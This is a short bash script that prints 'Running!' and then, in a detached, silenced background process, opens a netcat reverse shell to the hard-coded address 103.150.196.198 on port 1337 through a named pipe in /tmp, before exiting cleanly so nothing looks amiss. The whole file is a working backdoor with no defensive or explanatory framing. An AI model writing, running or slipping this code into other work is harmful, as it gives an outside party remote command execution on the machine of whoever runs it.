#!/bin/bash
echo Running!
(
  (
    mkfifo /tmp/f
    #!/bin/bash
    nc 103.150.196.198 1337 < /tmp/f | sh > /tmp/f 2>&1
    rm /tmp/f
  ) </dev/null >/dev/null 2>&1 &
) &
exit 0
